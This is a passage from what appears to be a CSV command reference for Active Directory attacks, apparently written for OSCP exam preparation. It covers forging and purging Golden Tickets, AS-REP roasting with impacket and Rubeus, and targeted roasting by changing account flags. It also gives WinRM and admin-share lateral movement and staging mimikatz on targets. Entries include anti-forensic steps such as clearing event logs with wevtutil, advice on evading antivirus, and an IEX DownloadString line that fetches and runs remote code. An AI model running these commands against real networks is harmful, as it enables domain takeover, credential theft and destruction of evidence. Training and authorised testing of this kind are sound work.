""cmd.exe"": ""Command to execute on remote system. PsExec launches this in an interactive shell with SYSTEM privileges by default. Alternatives: powershell.exe (interactive PowerShell), whoami /groups (verify group memberships), ipconfig (verify you're on target)."", ""Default behavior"": ""PsExec uses current session's credentials. With Golden Ticket injected, this means domain-administrative access via forged Kerberos ticket. PsExec doesn't know the ticket is forged - it's valid Kerberos authentication.""}","[""ad-golden-ticket-mimikatz-create"", ""ad-golden-ticket-verify-klist""]","","[""ad-dcsync-mimikatz-user""]"
"ad-golden-ticket-cleanup","Remove Golden Ticket (Cleanup)","post-exploit","mimikatz # kerberos::purge","Remove Golden Ticket from memory by purging all Kerberos tickets. Essential for OPSEC and cleanup after completing objectives. Removes forensic evidence from ticket cache.","active-directory","","OPSEC consideration: Purging tickets removes the forged Golden Ticket from memory but doesn't erase all traces. Windows Event Logs (Event IDs 4768, 4769, 4770) record Kerberos ticket operations. For complete cleanup: (1) Purge tickets, (2) Clear relevant event logs (if you have admin rights), (3) Close any SMB/RPC connections to domain resources. EXAM NOTE: In OSCP, cleanup is less critical (not a red team engagement), but understanding cleanup demonstrates operational maturity. Time estimate: Instant (<1 second).

MANUAL ALTERNATIVES:
Native Windows:
klist purge

Complete cleanup:
klist purge && net use * /delete /y

Event log cleanup (requires admin):
wevtutil cl Security
wevtutil cl System

Alternative: Reboot (clears all tickets):
shutdown /r /t 0

TIME ESTIMATE: < 5 seconds (purge only), 1-2 minutes (including log cleanup)","medium","","","","{""Access is denied"": ""Insufficient privileges. Solution: Should work for standard users on their own session. If failing, run as Administrator."", ""Tickets reappear after purge"": ""Normal behavior if actively authenticated. Solution: Close SMB connections: net use * /delete. Tickets will regenerate when accessing domain resources.""}","{""kerberos::purge"": ""Deletes all Kerberos tickets from current session, including forged Golden Tickets. Same command as pre-injection ticket purge, but used here for cleanup. After purging, re-authenticate to domain resources with legitimate credentials to restore normal operation. WHY: Removes forged ticket from system, reducing forensic footprint. Ticket cache is logged in Windows Event Logs (Event ID 4768/4769), so cleanup is important for OPSEC.""}","","",""
"ad-golden-ticket-ticketer-create","Create Golden Ticket with Impacket Ticketer","active-directory","impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>","Forge a Golden Ticket TGT using Impacket's ticketer tool from Linux","kerberos","impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local Administrator","Creates .ccache file. Export: export KRB5CCNAME=Administrator.ccache. Then use with: psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass","high","","","","","{""-nthash"": ""NTLM hash of krbtgt account (obtained via DCSync)"", ""-domain-sid"": ""Domain SID (obtain with lookupsid.py or from DCSync output)"", ""-domain"": ""Target domain FQDN""}","","",""
"kerberos-time-sync","Sync Time with Domain Controller","active-directory","ntpdate -u <DC_IP>","Synchronize attacker machine time with DC for Kerberos authentication (required within 5 minute skew)","kerberos","ntpdate -u 192.168.50.70","Kerberos requires <5 minute clock skew. Essential before ticket operations. Alternative: rdate -n <DC_IP> or faketime for non-root.","high","","","","","{""-u"": ""Use unprivileged port for NTP query""}","","",""
"kerberos-rubeus-asktgt","Request TGT with Rubeus","active-directory","Rubeus.exe asktgt /user:<USER> /password:<PASS> /domain:<DOMAIN> /ptt","Request a TGT for specified user and inject into current session","kerberos","Rubeus.exe asktgt /user:Administrator /password:Password123! /domain:corp.local /ptt","Use /rc4:<hash> or /aes256:<hash> instead of /password for pass-the-hash. Verify with: klist","high","","","","","{""asktgt"": ""Request TGT from KDC"", ""/user"": ""Target username"", ""/password"": ""User password (alt: /rc4, /aes256 for hash)"", ""/domain"": ""Target domain"", ""/ptt"": ""Pass-The-Ticket - inject into current session""}","","",""
"impacket-getnpusers-asreproast","impacket-GetNPUsers - AS-REP Roasting Attack","password-attacks","impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE> <DOMAIN>/<USERNAME>","Extract AS-REP hashes from users with 'Do not require Kerberos preauthentication' enabled (AS-REP Roasting).
Targets misconfigured accounts to obtain crackable password hashes without authentication.","active-directory","impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete","AS-REP ROASTING extracts encrypted AS-REP responses from users with Kerberos preauthentication DISABLED.

WHY THIS WORKS:
Without preauthentication, you can request AS-REP (TGT response) for any user without knowing their password.

The AS-REP contains encrypted data using the user's password hash, which can be cracked offline.

DEFAULT SETTING:
Preauthentication is ENABLED by default (secure).

Users with preauthentication disabled are rare - typically required for legacy applications or misconfigurations.

ATTACK REQUIREMENTS:
(1) Valid domain credentials (for authenticated query) OR (2) Network access to DC (for unauthenticated username enumeration with -usersfile).

HASH FORMAT:
Output is Hashcat mode 18200 compatible.

OSCP TIP:
Always try AS-REP roasting early in domain assessment - it's fast (5-30 seconds) and may reveal weak passwords on privileged accounts.

TIME ESTIMATE:
5-10 seconds for hash extraction + 1-60 minutes for cracking (depends on password complexity).

DETECTION:
Event ID 4768 (Kerberos TGT request) - normal traffic, low visibility.

MANUAL ALTERNATIVE:
Use Rubeus.exe asreproast from Windows for same functionality without authentication requirements (domain-joined system).

TARGETED ATTACK:
If you have GenericWrite/GenericAll permissions on a user, you can enable 'Do not require preauthentication', extract hash, crack password, then disable the setting (see targeted-asreproast-set).

Clock sync is CRITICAL - use ntpdate or rdate if you receive KRB_AP_ERR_SKEW errors.","high","","","","{""KRB_AP_ERR_SKEW(Clock skew too great)"": ""Time sync issue. Solution: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>. Kerberos requires <5 minute time difference between client and DC."", ""Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN"": ""Username or domain incorrect. Verify with: impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/ (no username = list all). Check domain name spelling."", ""No entries"": ""No users have 'Do not require Kerberos preauthentication' enabled. This is DEFAULT (preauthentication required). Try impacket-getnpusers-identify to confirm.""}","{""-dc-ip"": ""Domain controller IP - Target DC for AS-REQ requests"", ""-request"": ""Request AS-REP hashes - Automatically identify and extract hashes from vulnerable users"", ""-outputfile"": ""Save hashes to file in Hashcat-compatible format (mode 18200)"", ""-format"": ""Hash format - Options: hashcat (default), john. Use hashcat for mode 18200 compatibility"", ""-usersfile"": ""File containing usernames to test (alternative to domain authentication)""}","","[""rubeus-asreproast"", ""impacket-getnpusers-identify""]","[""hashcat-crack-asrep"", ""crackmapexec-validate-admin"", ""kerbrute-validate-creds""]"
"impacket-getnpusers-identify","impacket-GetNPUsers - Identify Vulnerable Users","enumeration","impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USERNAME>","Enumerate users with 'Do not require Kerberos preauthentication' enabled without extracting hashes.
Identifies vulnerable accounts before attempting AS-REP Roasting attack.","active-directory","impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete","IDENTIFICATION ONLY - lists vulnerable users without requesting hashes.

Use this for:
(1) Reconnaissance before attack.

(2) Verifying users exist.

(3) Checking if AS-REP roasting is viable.

OUTPUT COLUMNS:
Name (username), MemberOf (group membership - look for admin groups), PasswordLastSet (old passwords = easier to crack), LastLogon (active account check), UAC (User Account Control flags - 0x410200 = preauthentication disabled).

UNAUTHENTICATED MODE:
Omit username or use -no-pass flag to enumerate without credentials (rare - most domains require authentication).

OSCP STRATEGY:
Run this BEFORE extracting hashes to:
(1) Identify high-value targets (Domain Admins, privileged accounts).

(2) Estimate attack surface (10 vulnerable users vs 1).

(3) Prioritize targets by PasswordLastSet date.

TIME ESTIMATE:
<5 seconds.

NO HASH EXTRACTION:
Add -request flag to extract hashes (see impacket-getnpusers-asreproast).

DETECTION:
Minimal - standard LDAP queries, Event ID 4662 (LDAP query) - normal enumeration traffic.","high","","","","{""No entries"": ""No users have preauthentication disabled. This is expected - AS-REP roasting requires misconfigured accounts. Focus on other attack vectors."", ""Clock skew error"": ""Time sync required: sudo ntpdate <DC_IP>""}","{""-dc-ip"": ""Domain controller IP"", ""-no-pass"": ""Unauthenticated enumeration - No password required (useful for external assessments)""}","","[""powerview-asreproast-identify""]","[""impacket-getnpusers-asreproast"", ""rubeus-asreproast""]"
"rubeus-asreproast","Rubeus - AS-REP Roasting (Windows)","password-attacks",".\Rubeus.exe asreproast /nowrap","Extract AS-REP hashes from Windows domain-joined system using Rubeus.
Native Windows alternative to impacket-GetNPUsers with automatic domain context.","active-directory","","WINDOWS-BASED AS-REP ROASTING using Rubeus.exe.

ADVANTAGES OVER IMPACKET:
(1) No credentials required (uses current domain user context automatically).

(2) Faster from Windows (native Kerberos API).

(3) No time sync issues.

(4) Auto-discovers domain info.

CRITICAL:
Use /nowrap flag to prevent line breaks in hash output - Hashcat requires single-line format.

Without /nowrap, hash will span multiple lines and fail to crack.

EXECUTION CONTEXT:
Must run from domain-joined Windows system OR use runas /netonly.

TOOL LOCATION:
Rubeus.exe typically in C:\Tools\ on OSCP lab systems.

Download from:
https://github.com/GhostPack/Rubeus.

HASH OUTPUT:
Default format is Hashcat mode 18200 compatible.

OSCP TIP:
Rubeus is preferred when you have RDP/WinRM access to Windows box.

No time sync needed, no credential entry required (uses current session).

TIME ESTIMATE:
5-10 seconds for hash extraction.

AV EVASION:
Rubeus is flagged by Windows Defender.

Options:
(1) Disable AV temporarily.

(2) Use obfuscated version.

(3) Reflectively load in memory.

(4) Fall back to impacket-GetNPUsers from Linux.

OUTPUT PARSING:
Copy hash starting from $krb5asrep$ to end (single line with /nowrap).

DETECTION:
Event ID 4768 (TGT request) - standard Kerberos traffic, low visibility.

MULTIPLE USERS:
Rubeus automatically finds ALL vulnerable users and displays hashes sequentially.","high","","","","{""No users found"": ""No accounts with preauthentication disabled. Expected - this is the secure default. Confirm with: .\\Rubeus.exe asreproast (no flags)."", ""Access denied"": ""Need domain user context. Solution: Run from domain-joined Windows system as authenticated user OR use runas: runas /netonly /user:<DOMAIN>\\<USER> cmd.exe"", ""Unhandled Rubeus exception"": ""Rubeus version incompatibility or AV detection. Try: (1) Re-download latest Rubeus. (2) Obfuscate binary. (3) Use impacket-GetNPUsers from Linux instead.""}","{""asreproast"": ""AS-REP roasting mode - Automatically find and extract hashes from vulnerable users"", ""/nowrap"": ""Disable line wrapping in hash output - CRITICAL for Hashcat compatibility (prevents newlines in hash)"", ""/format"": ""Output format - Options: hashcat (default), john. Use hashcat for mode 18200"", ""/user"": ""Target specific user - Syntax: /user:username (useful if you know vulnerable account)"", ""/domain"": ""Specify domain - Auto-detected from current domain context if omitted"", ""/dc"": ""Domain controller - Specify DC if multiple DCs exist: /dc:DC1.corp.com"", ""/outfile"": ""Save to file - Syntax: /outfile:C:\\hashes.txt""}","","[""impacket-getnpusers-asreproast""]","[""hashcat-crack-asrep""]"
"powerview-asreproast-identify","PowerView - Identify AS-REP Roastable Users","enumeration","Get-DomainUser -PreauthNotRequired -Properties samaccountname,memberof,pwdlastset","Use PowerView to enumerate users with Kerberos preauthentication disabled.
PowerShell-based identification of AS-REP Roasting targets with detailed attribute filtering.","active-directory","","POWERVIEW ENUMERATION for AS-REP roastable users.

IDENTIFICATION ONLY - does not extract hashes (use Rubeus or impacket for extraction).

WHY POWERVIEW:
(1) Rich filtering options.

(2) Detailed user attributes.

(3) Integrated with other PowerView cmdlets for further enumeration.

OUTPUT ANALYSIS:
pwdlastset (old dates = weak password likely), memberof (look for 'Domain Admins', 'Enterprise Admins', privileged groups), admincount=1 (privileged account).

POWERVIEW LOCATION:
C:\Tools\PowerView.ps1 on lab systems OR download from PowerSploit GitHub.

IMPORT METHOD:
Import-Module .\PowerView.ps1 OR dot-source:
.

.\PowerView.ps1.

EXECUTION POLICY:
May need -ExecutionPolicy Bypass:
powershell -ep bypass -c 'Import-Module .\PowerView.ps1; Get-DomainUser -PreauthNotRequired'.

ALTERNATIVE SYNTAX:
Get-NetUser -PreauthNotRequired (older PowerView alias, same functionality).

OSCP TIP:
Combine with other PowerView cmdlets for comprehensive enumeration:
Get-DomainUser -PreauthNotRequired | Get-DomainGroup (find groups), Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,pwdlastset | Sort-Object pwdlastset (sort by password age - oldest = easiest targets).

UAC FLAG:
The 'DONT_REQ_PREAUTH' flag is 0x400000 in userAccountControl attribute.

TIME ESTIMATE:
<5 seconds for enumeration.

NEXT STEP:
Use Rubeus or impacket-GetNPUsers to extract hashes for identified users.","high","","","","{""Get-DomainUser not recognized"": ""PowerView not loaded. Solution: Import-Module C:\\Tools\\PowerView.ps1 OR download: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"", ""Access denied"": ""Requires domain user context. Run from domain-joined system or use runas /netonly"", ""No output"": ""No vulnerable users found. This is expected - preauthentication disabled is rare (insecure configuration).""}","{""-PreauthNotRequired"": ""Filter for users with 'DONT_REQ_PREAUTH' UAC flag (AS-REP roastable)"", ""-Properties"": ""Specify properties to retrieve - Useful properties: samaccountname (username), memberof (groups), pwdlastset (password age), lastlogon (activity), admincount (privileged account indicator)"", ""-Identity"": ""Target specific user - Syntax: -Identity username"", ""-LDAPFilter"": ""Custom LDAP filter - Advanced users only"", ""-Server"": ""Specify domain controller - Syntax: -Server DC1.corp.com""}","","[""impacket-getnpusers-identify""]","[""rubeus-asreproast"", ""impacket-getnpusers-asreproast""]"
"targeted-asreproast-set","Targeted AS-REP Roasting - Enable DONT_REQ_PREAUTH","privilege-escalation","Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose","Set 'Do not require Kerberos preauthentication' on user account for targeted AS-REP roasting.
Requires GenericWrite/GenericAll permissions - enables hash extraction on arbitrary accounts.","active-directory","Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} -Verbose","TARGETED AS-REP ROASTING attack for scenarios where no users have preauthentication disabled by default.

REQUIREMENTS:
GenericWrite OR GenericAll permissions on target user account.

ATTACK FLOW:
(1) Identify user you have write permissions on.

(2) Enable DONT_REQ_PREAUTH flag.

(3) Extract AS-REP hash with Rubeus/impacket.

(4) Crack hash offline.

(5) CLEANUP:
Reset UAC to original value (CRITICAL - see targeted-asreproast-cleanup).

UAC FLAG:
4194304 decimal = 0x400000 hex = DONT_REQ_PREAUTH bit.

XOR operation toggles this bit without modifying other UAC flags (safer than -Set).

ETHICAL NOTE:
This modifies production AD and temporarily weakens security.

ALWAYS reset UAC after obtaining hash.

Document changes in assessment notes.

OSCP SCENARIO:
Common in environments with delegated permissions, service account management, or misconfigured ACLs.

PERMISSION CHECK:
Get-DomainObjectAcl -Identity <USERNAME> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (whoami /user)[1]} | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll'}.

TIME ESTIMATE:
5 seconds to set flag + 5 seconds to extract hash + 1-60 minutes to crack.

DETECTION:
Event ID 4738 (user account changed) - shows userAccountControl modification.

Highly suspicious if DONT_REQ_PREAUTH enabled on production account.

CLEANUP CRITICAL:
Failing to reset UAC leaves account vulnerable.

Set reminder or use script to auto-reset after 30 minutes.

ALTERNATIVE METHODS:
(1) Reset password (more obvious, locks out user).

(2) Add SPN for Kerberoasting (see targeted-kerberoast-set).

(3) Modify group membership (requires different permissions).","medium","","","","{""Access denied"": ""Missing GenericWrite/GenericAll permissions on target user. Verify: Get-DomainObjectAcl -Identity <USERNAME> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll'}"", ""Set-DomainObject not recognized"": ""PowerView not loaded. Import: Import-Module .\\PowerView.ps1""}","{""-Identity"": ""Target user account"", ""-XOR"": ""XOR operation on userAccountControl - 4194304 is the DONT_REQ_PREAUTH flag (0x400000). XOR toggles the flag without affecting other UAC bits."", ""-Verbose"": ""Show detailed output for confirmation"", ""-Set"": ""Alternative to -XOR - Directly set UAC value (more dangerous, can overwrite other flags)""}","","","[""rubeus-asreproast"", ""impacket-getnpusers-asreproast"", ""targeted-asreproast-cleanup""]"
"targeted-asreproast-cleanup","Targeted AS-REP Roasting - Reset UAC (Cleanup)","utilities","Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose","Remove 'Do not require Kerberos preauthentication' flag after targeted AS-REP roasting attack.
Critical cleanup step to restore account security configuration after exploitation.","active-directory","Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} -Verbose","CRITICAL CLEANUP STEP after targeted AS-REP roasting.

XOR OPERATION IS REVERSIBLE:
Same command that enabled DONT_REQ_PREAUTH also disables it (XOR toggles bit).

VERIFICATION:
Get-DomainUser -Identity <USERNAME> -Properties useraccountcontrol | Select-Object useraccountcontrol.

Normal UAC values:
512 (enabled account), 544 (password not required - disabled), 66048 (disabled account).

Values with 4194304 added indicate DONT_REQ_PREAUTH enabled.

OSCP REQUIREMENT:
Always document cleanup steps in assessment report.

Show before/after UAC values as evidence of proper cleanup.

AUTOMATION:
Create script to auto-reset after 30 minutes:
Start-Sleep -Seconds 1800; Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304}.

TIME TO CLEANUP:
<5 seconds.

WHY CLEANUP MATTERS:
(1) Ethical requirement - don't leave client environment more vulnerable.

(2) Detection - prolonged DONT_REQ_PREAUTH on account triggers alerts.

(3) Compliance - required for professional pentesting certifications.

FAILED CLEANUP:
If you lose access before cleanup, document in report and notify client immediately.

Provide manual cleanup steps:
Open ADUC  Find user  Properties  Account tab  Uncheck 'Do not require Kerberos preauthentication'.

VERIFICATION COMMAND:
(Get-DomainUser -Identity <USERNAME> -Properties useraccountcontrol).useraccountcontrol -band 4194304 (should return 0 after cleanup).","high","","","","{""Access denied"": ""Lost permissions or user account locked. Escalate to domain admin or notify client."", ""How to verify flag removed"": ""Get-DomainUser -Identity <USERNAME> -Properties useraccountcontrol. Verify DONT_REQ_PREAUTH flag not present (UAC should be 512 or 544 for normal user, not 4194816).""}","{""-Identity"": ""Target user account"", ""-XOR"": ""XOR operation toggles DONT_REQ_PREAUTH flag back to disabled (same command as set - XOR is reversible)"", ""-Verbose"": ""Confirm flag removed""}","[""targeted-asreproast-set""]","",""
"enter-pssession","PowerShell Remote Interactive Session","post-exploit","Enter-PSSession -ComputerName <TARGET>","Establish interactive PowerShell session on remote computer via WinRM (requires local admin or WinRM permissions)","","Enter-PSSession -ComputerName FILESERVER01.corp.com","PowerShell remoting uses WinRM (Windows Remote Management) over HTTP port 5985 or HTTPS port 5986.

Requires:
(1) Local admin on target OR membership in Remote Management Users group, (2) WinRM service enabled (default on Server 2012+, disabled on workstations pre-Windows 10), (3) Firewall allows TCP 5985/5986.

Advantages over PsExec:
Uses native Windows service (less suspicious), supports pass-the-hash via Invoke-Command, allows script execution remotely.

Session is fully interactive - TAB completion works, can run multi-line scripts.

OSCP:
Preferred lateral movement method when available - cleaner than PsExec, less likely to trigger AV.

Test WinRM availability with Test-WSMan <TARGET> before attempting connection.","high","","","","{""WinRM cannot process the request"": ""WinRM not enabled on target. Enable: Enable-PSRemoting -Force (requires local admin access)"", ""Access is denied"": ""User not in local Administrators group or Remote Management Users group. Verify access: Test-WSMan <TARGET>"", ""Connecting to remote server failed"": ""Firewall blocking port 5985 (HTTP) or 5986 (HTTPS). Test: Test-NetConnection <TARGET> -Port 5985"", ""TrustedHosts error"": ""Workgroup/IP-based connection requires TrustedHosts configuration: Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value <TARGET> -Force""}","{""-ComputerName"": ""Target system for remote session. Must have WinRM enabled (default on Server 2012+, manual on workstations)."", ""-Credential"": ""Specify alternate credentials: Enter-PSSession -ComputerName <TARGET> -Credential CORP\\admin""}","","[""invoke-command""]",""
"invoke-command","PowerShell Remote Command Execution","post-exploit","Invoke-Command -ComputerName <TARGET> -ScriptBlock { <COMMAND> }","Execute PowerShell commands or script blocks on remote systems via WinRM without interactive session","","Invoke-Command -ComputerName WS01.corp.com,WS02.corp.com -ScriptBlock { whoami; hostname; ipconfig }","Non-interactive alternative to Enter-PSSession.

Advantages:
(1) Execute single commands without persistent session, (2) Run on multiple computers simultaneously (-ComputerName accepts arrays), (3) Return output to local console (vs interactive prompt).

Use cases:
Quick enumeration (whoami, ipconfig), download/execute scripts (IEX + DownloadString), mass credential dumping across multiple systems.

Supports pass-the-hash when combined with Invoke-Mimikatz or Rubeus.

Script execution:
Use -FilePath to run local .ps1 files on remote systems (file is copied and executed).

OSCP:
Use for non-interactive command execution - faster than Enter-PSSession for single commands.

Combine with PowerView for remote AD enumeration:
Invoke-Command -ComputerName DC01 -ScriptBlock { Import-Module .\PowerView.ps1; Get-NetUser }.","high","","","","{""WinRM cannot process the request"": ""WinRM not enabled. Enable with: Enable-PSRemoting -Force"", ""Access is denied"": ""Need local admin or Remote Management Users membership. Test: Test-WSMan <TARGET>"", ""ScriptBlock syntax error"": ""Ensure proper PowerShell syntax inside {}. Test locally first: Invoke-Command -ComputerName localhost -ScriptBlock {...}"", ""Authentication error"": ""Pass credentials explicitly: -Credential (Get-Credential)""}","{""-ComputerName"": ""Target system(s) for command execution. Accepts arrays for multi-host execution."", ""-ScriptBlock"": ""PowerShell code to execute on remote system. Enclosed in curly braces {}."", ""-Credential"": ""Alternate credentials: Invoke-Command -ComputerName <TARGET> -Credential (Get-Credential) -ScriptBlock {...}"", ""-FilePath"": ""Execute local script on remote system: Invoke-Command -ComputerName <TARGET> -FilePath C:\\Scripts\\script.ps1""}","","[""enter-pssession""]",""
"test-wsman-connectivity","Test WinRM Connectivity","enumeration","Test-WSMan -ComputerName <TARGET>","Verify WinRM service is accessible on remote system before attempting PowerShell remoting","","Test-WSMan -ComputerName WS01.corp.com","Test-WSMan sends WS-Management identification request to target.

If WinRM service is running and accessible, returns service identification XML.

Does NOT require authentication to succeed - even if you don't have access, you'll see service info (proves service is running).

Access denied error = service running but authentication failed (good - means WinRM available, just need valid credentials).

Connection refused = service not running or firewall blocking.

Use this before attempting Enter-PSSession to avoid wasting time on non-WinRM targets.

OSCP:
Quick check before lateral movement.

If Test-WSMan succeeds, PowerShell remoting is viable.

If fails, pivot to PsExec, WMI, or DCOM methods.","high","","","","{""The client cannot connect"": ""WinRM service not running OR firewall blocking port 5985/5986. Check: Test-NetConnection <TARGET> -Port 5985"", ""Access is denied"": ""Authentication failure. Try with credentials: -Credential (Get-Credential). Check user is in Administrators or Remote Management Users group."", ""WinRM cannot complete the operation"": ""WinRM service disabled. If you have admin access via other method (PsExec), enable: Enable-PSRemoting -Force""}","{""-ComputerName"": ""Target system to test WinRM connectivity against"", ""-Credential"": ""Test with alternate credentials: Test-WSMan -ComputerName <TARGET> -Credential CORP\\admin"", ""-Authentication"": ""Specify authentication method: -Authentication Negotiate (default), Kerberos, Basic""}","[""nmap-service-scan""]","","[""evil-winrm-shell"", ""enter-pssession""]"
"enable-psremoting","Enable PowerShell Remoting","post-exploit","Enable-PSRemoting -Force","Configure WinRM service and firewall rules to enable PowerShell remoting on local or remote system (requires local admin)","","","Enable-PSRemoting performs multiple configuration steps:
(1) Starts WinRM service, (2) Sets WinRM to auto-start, (3) Creates HTTP listener on port 5985, (4) Creates firewall exception for WinRM ports, (5) Enables LocalAccountTokenFilterPolicy (allows remote admin via local accounts).

Normally run on the system you want to RECEIVE remote connections (not attacker machine).

If you compromise a system via other means (RDP, PsExec) and want to enable WinRM for future access, run this command.

Requires local admin.

OSCP scenario:
You get RDP access to workstation where WinRM is disabled.

Enable it for cleaner future access:
Enable-PSRemoting -Force -SkipNetworkProfileCheck.

Now you can use Enter-PSSession instead of RDP (less network traffic, more stealthy).","medium","","","","{""Access is denied"": ""Must be local admin. Run PowerShell as Administrator."", ""Network connection type is set to Public"": ""Use -SkipNetworkProfileCheck flag OR change network profile: Set-NetConnectionProfile -NetworkCategory Private"", ""Unable to check firewall status"": ""Windows Firewall service disabled. Start: Start-Service mpssvc""}","{""-Force"": ""Skip confirmation prompts - enables remoting silently"", ""-SkipNetworkProfileCheck"": ""Enable remoting even on Public network profiles (normally blocked for security)""}","","",""
"test-admin-share-access","Test Administrative Share Access","enumeration","Test-Path \\<TARGET>\C$","Verify local administrator access on remote system by testing C$ administrative share accessibility","","Test-Path \\FILESERVER01.corp.com\C$","Administrative shares (C$, ADMIN$, IPC$) are created automatically by Windows and only accessible to local Administrators group.

C$ provides access to C:
drive root, ADMIN$ maps to C:\Windows, IPC$ used for named pipes.

Testing C$ access = testing local admin membership.

Why this works:
SMB authentication uses current user context.

If Test-Path returns True, your credentials have local admin on target.

This is fast pre-check before attempting lateral movement tools (PsExec, WinRM) which all require local admin.

OSCP workflow:
(1) Find-LocalAdminAccess to discover admin access across domain, (2) Test-Path \\<TARGET>\C$ to verify specific target, (3) Execute lateral movement.

Alternative syntax:
dir \\<TARGET>\C$ (if succeeds = admin, if access denied = not admin).","high","","","","{""False returned but no error"": ""SMB working but you lack admin rights. This is normal - not all users have admin everywhere."", ""Network path not found"": ""Target offline, SMB disabled, or firewall blocking port 445. Test: Test-NetConnection <TARGET> -Port 445"", ""Access denied with valid admin"": ""UAC remote restrictions (Local Account Token Filter Policy). Workaround: Use domain admin account OR modify registry: reg add \\\\<TARGET>\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1""}","{""Test-Path"": ""PowerShell cmdlet to test if path exists and is accessible"", ""\\\\\\\\<TARGET>\\\\C$"": ""Administrative share path. C$ = C: drive root (ADMIN$ = Windows directory, IPC$ = inter-process communication)""}","","[""net-use-admin-share"", ""dir-admin-share""]",""
"net-use-admin-share","Map Administrative Share with Credentials","post-exploit","net use \\<TARGET>\C$ /user:<DOMAIN>\<USERNAME> <PASSWORD>","Authenticate to administrative share with explicit credentials to test access or establish persistent connection","","net use \\WS01.corp.com\C$ /user:CORP\administrator P@ssw0rd123","net use establishes authenticated SMB session to administrative shares.

Unlike Test-Path (uses current credentials), net use allows explicit credential specification.

Use cases:
(1) Test credentials against target, (2) Authenticate with compromised account, (3) Switch user context (if already connected as different user, disconnect first).

Connection persists until reboot OR explicit disconnect (net use /delete).

For local accounts (SAM database, not AD), use syntax:
/user:.\<USERNAME> where dot represents local machine.

OSCP:
Use to test credential validity after cracking passwords or finding credentials in files.

Successful net use = valid local admin credentials.

Follow with PsExec, WMI, or manual file operations via C$ share.","high","","","","{""Access denied"": ""Invalid credentials OR user not in local Administrators group. Verify: crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD>"", ""User name or password incorrect"": ""Check credentials. For local account, use: /user:.\\<USERNAME> (dot = local machine)"", ""Multiple connections error"": ""Existing connection to target. Disconnect first: net use \\\\<TARGET>\\C$ /delete OR net use * /delete /y (disconnect all)"", ""Network path not found"": ""SMB blocked or target offline. Check: Test-NetConnection <TARGET> -Port 445""}","{""/user"": ""Specify credentials in DOMAIN\\USERNAME format"", ""/persistent:no"": ""Don't save connection (optional - prevents persistence across reboots)"", ""/delete"": ""Disconnect from share: net use \\\\<TARGET>\\C$ /delete""}","[""crackmapexec-validate-admin"", ""evil-winrm-shell""]","[""smbmap-shares"", ""crackmapexec-smb-framework""]","[""dir-admin-share"", ""file-transfer-smb"", ""ad-sam-dump-reg-save""]"
"dir-admin-share","List Administrative Share Contents","enumeration","dir \\<TARGET>\<SHARE>","Browse contents of administrative shares (C$, ADMIN$) or regular file shares on remote system","","dir \\FILESERVER01\C$","Simple file browsing via SMB.

Administrative shares (C$, ADMIN$) require local admin.

Regular shares require explicit permissions.

Common reconnaissance patterns:
(1) dir \\<TARGET>\C$\Users\ - list user profiles (identify user accounts), (2) dir \\<TARGET>\C$\Users\*\Desktop\ /s - find files on all user desktops, (3) dir \\<TARGET>\C$\inetpub\wwwroot\ - web server files (web.config credentials), (4) dir \\<TARGET>\ADMIN$\System32\ - verify Windows directory access.

Use /s for recursive search, /b for clean file lists (pipe to findstr).

OSCP:
After confirming admin access (Test-Path), use dir to enumerate sensitive locations.

Look for:
credentials in Desktop/Documents, application configs in C:\inetpub or C:\Program Files, backup files in C:\Temp or C:\Backup.","high","","","","{""Access is denied"": ""No permissions on share. For admin shares, need local admin. For regular shares, need Read permissions."", ""Network path not found"": ""Invalid share name. List shares: net view \\\\<TARGET>"", ""System cannot find file specified"": ""Typo in path OR share doesn't exist. Common admin shares: C$, D$, ADMIN$ (Windows dir), IPC$ (named pipes)""}","{""/s"": ""Recursive listing (subdirectories): dir \\\\<TARGET>\\<SHARE> /s"", ""/b"": ""Bare format (file names only, no details): dir \\\\<TARGET>\\<SHARE> /b"", ""/a"": ""Show all files including hidden/system: dir \\\\<TARGET>\\<SHARE> /a""}","[""crackmapexec-validate-admin"", ""evil-winrm-shell"", ""net-use-admin-share""]","[""smbmap-shares"", ""crackmapexec-smb-framework""]","[""search-share-files"", ""file-transfer-smb""]"
"copy-file-admin-share","Copy File via Administrative Share","file-transfer","copy <LOCAL_FILE> \\<TARGET>\C$\<REMOTE_PATH>","Upload files to remote system via administrative share (C$, ADMIN$) - common for tool deployment and payload staging","","copy C:\Tools\mimikatz.exe \\FILESERVER01\C$\Temp\mimikatz.exe","Administrative share file transfer is core lateral movement technique.

Common pattern:
(1) Verify admin access (Test-Path \\<TARGET>\C$), (2) Upload tool (copy mimikatz.exe \\<TARGET>\C$\Temp\), (3) Execute (PsExec/WMI), (4) Retrieve output/cleanup.

Write locations:
C$\Temp (C:\Temp - usually writable), C$\Windows\Temp (C:\Windows\Temp - system temp), C$\Users\Public (C:\Users\Public - world-writable).

Avoid C$\ root (too obvious) or C$\Windows\System32 (protected).

OSCP:
This is how you deploy Mimikatz, reverse shells, and enumeration tools to remote systems.

After copy, use PsExec or WMI to execute.

Don't forget cleanup:
